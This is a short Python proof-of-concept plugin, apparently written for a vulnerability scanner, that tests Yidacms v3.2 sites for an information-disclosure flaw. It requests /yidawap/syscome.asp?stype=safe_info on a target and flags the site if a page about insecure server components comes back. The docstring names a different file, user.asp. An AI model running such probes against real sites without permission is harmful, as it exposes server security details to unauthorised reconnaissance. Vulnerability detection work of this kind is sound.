#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:ko0zhi
"""
POC Name  :	Yidacms v3.2 /Yidacms/user/user.asp 信息泄漏漏洞    POC
Reference  :  http://www.beebeeto.com/pdb/poc-2014-0172/
"""

import re

def assign(service,arg):
    if service == "yidacms":
        return True,arg
    pass

def audit(arg):
    url = arg
    payload = '/yidawap/syscome.asp?stype=safe_info'
    verify_url = url + payload
    code,head,res,errcode, final_url = curl.curl(verify_url)
    if '服务器相对不安全的组件检测' in res:
        security_info(verify_url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('yidacms', 'http://www.example.com/')[1])